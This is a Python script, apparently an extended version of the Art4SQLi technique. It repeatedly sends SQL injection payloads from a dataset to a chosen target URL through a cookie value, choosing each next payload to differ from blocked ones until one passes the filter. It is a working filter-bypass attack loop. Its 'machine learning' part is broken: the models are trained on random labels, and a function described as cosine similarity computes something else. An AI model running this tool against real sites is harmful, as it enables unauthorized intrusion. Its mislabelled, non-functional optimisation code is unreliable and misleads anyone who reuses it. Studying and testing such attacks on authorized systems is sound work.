import numpy as np
from random import randrange
import requests 
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import concurrent.futures
import math
import logging
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import accuracy_score
from datetime import datetime
import json
import os

class MLComponent:
    def __init__(self, features):
        self.models = self._initialize_models()
        self.scaler = StandardScaler()
        self.logger = logging.getLogger('MLComponent')
        self._initialize_scaler(features)
        
    def _initialize_models(self) -> dict:
        return {
            'random_forest': RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                min_samples_split=5,
                random_state=42
            ),
            'gradient_boost': GradientBoostingClassifier(
                n_estimators=100,
                learning_rate=0.1,
                max_depth=3,
                random_state=42
            )
        }
    
    def _initialize_scaler(self, features):
        # Initialize with feature data
        self.scaler.fit(features)
        
        # Train models with initial data
        dummy_labels = np.random.randint(0, 2, len(features))
        for model in self.models.values():
            model.fit(self.scaler.transform(features), dummy_labels)
    
    def predict_vulnerability(self, features: np.ndarray) -> float:
        features_scaled = self.scaler.transform(features.reshape(1, -1))
        probas = []
        
        for model in self.models.values():
            proba = model.predict_proba(features_scaled)[0][1]
            probas.append(proba)
            
        return np.mean(probas)

class EnhancedArt4SQLi:
    def __init__(self, target_url: str, feature_file: str, dataset_file: str):
        self.target_url = target_url
        self.features = np.load(feature_file)
        self.dataset = np.load(dataset_file)
        self.ml_component = MLComponent(self.features)
        self.logger = self._setup_logger()
        self.results_dir = self._setup_results_directory()
        
    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger('EnhancedArt4SQLi')
        logger.setLevel(logging.INFO)
        handler = logging.FileHandler('art4sqli_testing.log')
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger
        
    def _setup_results_directory(self) -> str:
        dirname = f'results_{datetime.now().strftime("%Y%m%d_%H%M%S")}'
        os.makedirs(dirname, exist_ok=True)
        return dirname

    def test_payload(self, payload: str) -> bool:
        """Test payload against target URL"""
        session = requests.Session()
        headers = requests.utils.default_headers()
        headers.update({'Cookie': f"pid={payload}"})
        
        retries = Retry(total=25, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        session.mount('http://', HTTPAdapter(max_retries=retries))
        
        try:
            response = session.get(
                url=self.target_url,
                params={'payload': 'payload'},
                headers=headers
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.error(f"Error testing payload: {str(e)}")
            return False

    def sim2(self, vector1: np.ndarray, vector2: np.ndarray) -> float:
        """Calculate cosine similarity between two vectors"""
        cosine = np.dot(vector1, vector2)
        if cosine == 0:
            return math.inf
        return 1 / cosine

    def optimize_payload(self, feature: np.ndarray) -> float:
        """Use ML to optimize payload selection"""
        vulnerability_score = self.ml_component.predict_vulnerability(feature)
        return vulnerability_score

    def run_test(self, process_id: int, test_count: int = 100, k: int = 10) -> list:
        results = []
        
        for t in range(test_count):
            self.logger.info(f"Process {process_id}: Starting test {t}")
            blocked = []
            data, features = list(self.dataset), list(self.features)
            candidates_d, candidates_f = [], []
            
            while True:
                # Select k random candidates
                r = randrange(len(data) - k)
                for i in range(r, r + k):
                    candidates_d.append(data.pop(r))
                    candidates_f.append(features.pop(r))
                
                if not blocked:
                    # Select first random candidate if nothing is blocked
                    r = randrange(k)
                    test_case, feature = candidates_d.pop(r), candidates_f.pop(r)
                else:
                    # Use ML to optimize selection
                    best_score = -1
                    best_idx = 0
                    
                    for i, feature in enumerate(candidates_f):
                        score = self.optimize_payload(feature)
                        if len(blocked) > 0:
                            md = min(self.sim2(b, feature) for b in blocked)
                            combined_score = score * md
                        else:
                            combined_score = score
                        
                        if combined_score > best_score:
                            best_score = combined_score
                            best_idx = i
                    
                    test_case, feature = candidates_d.pop(best_idx), candidates_f.pop(best_idx)
                
                # Return unused candidates
                for i in range(len(candidates_f)):
                    data.append(candidates_d.pop(0))
                    features.append(candidates_f.pop(0))
                
                # Test the payload
                if self.test_payload(test_case):
                    break
                
                blocked.append(feature)
                self.logger.info(f"Process {process_id}: Test {t+1}: Blocked count {len(blocked)}")
            
            results.append(len(blocked))
            self._save_results(process_id, results)
            
        return results
    
    def _save_results(self, process_id: int, results: list):
        """Save results to file"""
        filename = os.path.join(self.results_dir, f"art4sqli_results_p{process_id}.npy")
        np.save(filename, results)
        
        # Also save as JSON for better readability
        json_filename = os.path.join(self.results_dir, f"art4sqli_results_p{process_id}.json")
        with open(json_filename, 'w') as f:
            json.dump({
                'process_id': process_id,
                'results': results,
                'mean_blocked': float(np.mean(results)),
                'max_blocked': int(np.max(results)),
                'min_blocked': int(np.min(results))
            }, f, indent=2)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Enhanced Art4SQLi with Machine Learning')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--features', required=True, help='Path to feature file (npy)')
    parser.add_argument('--dataset', required=True, help='Path to dataset file (npy)')
    parser.add_argument('--processes', type=int, default=1, help='Number of parallel processes')
    
    args = parser.parse_args()
    
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Initialize tester
    tester = EnhancedArt4SQLi(args.url, args.features, args.dataset)
    
    # Run tests in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.processes) as executor:
        futures = [
            executor.submit(tester.run_test, i) 
            for i in range(args.processes)
        ]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                results = future.result()
                logging.info(f"Process completed with results: {results}")
            except Exception as e:
                logging.error(f"Process failed with error: {str(e)}")

if __name__ == "__main__":
    main()
